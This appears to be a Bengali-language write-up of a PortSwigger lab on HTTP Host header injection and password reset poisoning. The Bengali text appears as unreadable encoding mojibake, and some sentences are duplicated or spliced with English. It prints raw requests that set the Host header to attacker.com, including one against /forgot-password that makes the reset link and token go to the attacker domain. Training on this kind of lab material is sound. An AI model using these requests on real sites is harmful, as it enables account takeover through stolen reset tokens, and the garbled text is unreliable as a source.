
ЁЯзк HTTP Host Header Attack
ЁЯУЪ PortSwigger Lab 

ржЖржорж┐ ржПржЗ PortSwigger рж▓рзНржпрж╛ржмржЯрж┐ рж▓ржХрзНрж╖рзНржп ржХрж░ржЫрж┐ред
ржПржХржЯрж┐ web application ржЖржЫрзЗред web application Host header ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ link рждрзИрж░рж┐ ржХрж░рзЗред
Backend logic-ржП Host header ржХрзЗ trusted ржзрж░рж╛ рж╣рзЯрзЗржЫрзЗ
Proper validation ржмрж╛ allow-list ржмрзНржпржмрж╣рж╛рж░ ржХрж░рж╛ рж╣рзЯржирж┐ ржПржЗ ржнрзБрж▓рзЗрж░ ржХрж╛рж░ржгрзЗ Host Header Injection рж╕ржорзНржнржм


ЁЯза Host Header Attack ржХрзА?
HTTP request-ржП Host header server-ржХрзЗ ржЬрж╛ржирж╛рзЯ ржХрзЛржи domain-ржПрж░ ржЬржирзНржп requestред

ржпржЦржи ржХрзЛржирзЛ application:

User-controlled Host header validate ржХрж░рзЗ ржирж╛
Link generation, password reset, redirect-ржП ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ
рждржЦржи attacker Host header ржкрж░рж┐ржмрж░рзНрждржи ржХрж░рзЗ attack ржЪрж╛рж▓рж╛рждрзЗ ржкрж╛рж░рзЗред


ЁЯФН Initial Observation (ржЖржорж┐ ржХрзАржнрж╛ржмрзЗ рж╢рзБрж░рзБ ржХрж░рж┐)
ржЖржорж┐ Burp Suite ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ ржПржХржЯрж┐ рж╕рж╛ржзрж╛рж░ржг рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ ржЗржирзНржЯрж╛рж░рж╕рзЗржкрзНржЯ ржХрж░рж┐:

GET / HTTP/1.1
Host: lab-id.web-security-academy.net

ржЖржорж┐ рж▓ржХрзНрж╖рзНржп ржХрж░рж┐:

Response-ржП absolute URL рждрзИрж░рж┐ рж╣ржЪрзНржЫрзЗ
ржЖржорж┐ ржЬрж╛ржирж┐ backend-ржП Host header ржмрзНржпржмрж╣рж╛рж░ рж╣ржЪрзНржЫрзЗ

ЁЯФО Testing Host Header Injection
ржЖржорж┐ Burp Repeater-ржП request ржкрж╛ржарж┐рзЯрзЗ
Host header ржкрж░рж┐ржмрж░рзНрждржи ржХрж░рж┐ред

тЬФя╕П Modified Request:
GET / HTTP/1.1
Host: attacker.com

ЁЯФе Result:
Response-ржП generated link ржмрж╛ redirect-ржП attacker.com ржжрзЗржЦрж╛ ржпрж╛рзЯ
тЮбя╕П ржПржЦрж╛ржирзЗржЗ ржирж┐рж╢рзНржЪрж┐ржд рж╣ржЗ
Application Host header-ржХрзЗ blindly trust ржХрж░ржЫрзЗ


ЁЯТе Exploitation (Lab Solution)
ржПржЗ рж▓рзНржпрж╛ржмрзЗ ржорзВрж▓ рж▓ржХрзНрж╖рзНржп ржЫрж┐рж▓
ржЖржорж┐ the Host header manipulation ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ ржЖржХрзНрж░ржоржгржЯрж┐ ржжрзЗржЦрж╛ржЪрзНржЫрж┐ред the Host header manipulation ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ ржЖржХрзНрж░ржоржгржЯрж┐ ржХрж░рзЗ ржжрзЗржЦрж╛ржЗред

ржЖржорж┐ password reset functionality test ржХрж░рж┐ред

тЬФя╕П Password Reset Request:
POST /forgot-password HTTP/1.1
Host: attacker.com

ЁЯУй Application reset link рждрзИрж░рж┐ ржХрж░рзЗ:

https://attacker.com/reset?token=XXXX

тЮбя╕П ржжрзЗржЦрзБржи ржпржжрж┐ victim ржПржЗ link ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗред
reset token attacker-controlled domain-ржП ржЪрж▓рзЗ ржпрж╛ржмрзЗред


ЁЯУШ My Learning Outcome
HTTP header-ржУ serious attack surface рж╣рждрзЗ ржкрж╛рж░рзЗ
Host header misuse ржХрж░рж▓рзЗ authentication bypass рж╕ржорзНржнржм
Simple misconfiguration ржерзЗржХрзЗржУ high-impact bug рждрзИрж░рж┐ рж╣рзЯ
I find that the PortSwigger lab helps to understand a realтАСworld logic flaw. The PortSwigger lab helps to understand a realтАСworld logic flaw. ржмрзБржЭрждрзЗ рж╕рж╛рж╣рж╛ржпрзНржп ржХрж░рзЗ.
mk